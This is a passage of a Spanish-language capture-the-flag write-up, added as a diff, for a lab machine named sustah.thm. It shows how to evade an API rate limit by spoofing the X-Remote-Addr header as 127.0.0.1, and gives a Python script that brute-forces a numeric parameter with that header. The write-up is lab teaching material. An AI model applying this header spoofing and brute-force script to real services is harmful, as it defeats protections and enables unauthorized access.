@@ -99,7 +99,51 @@ Enunciado : Responder a una serie de preguntas y  obtener las flags de usuario y
     RateLimit-Reset: Indica el tiempo restante para que el límite de solicitudes sea redefinido.
 
 
+---
+Explotamos la aplicacion por fuerza bruta.
 
+1)Nesesitamos bypasear el limite de llamadas a la API.
+
+Info --> https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass
+
+En la cabezera de la request vamos a incluir la siguiente propiedad  (X-Remote-Addr: 127.0.0.1)
+
+        En el caso de "X-Remote-Addr: 127.0.0.1", el encabezado parece indicar la dirección IP del cliente remoto (la computadora o el dispositivo del usuario)
+        que realizó la solicitud HTTP al servidor. La dirección IP 127.0.0.1 es una dirección IP especial que apunta a la interfaz de bucle invertido de la máquina local, 
+        lo que significa que se refiere a la misma máquina en la que se ejecuta el servidor.
+
+Como vemos hemos podidos saltar el limite, la respuesta ya no incluye en su cabecera los x-limit.
+
+![image](https://github.com/Esevka/CTF/assets/139042999/cc781051-3f59-4c54-b9fe-28b1d30b1efd)
+
+2)Nos vamos a crear un script en python donde vamos a realizar request incluyendo en el encabezado x-Remote y como data le enviamos la variable number con un valor numerico, veremos si damos con el numero correcto.
+
+Contenido del spinner.py, el range del buble for lo aumentaremos en el caso que no este el numero entre 0 y 20000.
+
+    import requests
+    
+    def spinner(number):
+    
+            url = 'http://sustah.thm:8085/'
+            custom_header = {'X-Remote-Addr':'127.0.0.1'}
+            data_number = {'number':'{}'.format(number)}
+    
+            r = requests.post(url,headers=custom_header,data=data_number)
+    
+            if 'Spin the wheel and try again' in r.text:
+                    print(number)
+            else:
+                    print(r.text)
+                    exit()
+                    
+    def main():
+            for x in range(0,20000):
+                    spinner(x)
+    
+    if __name__=='__main__':
+            main() 
+
+    
 
   
 
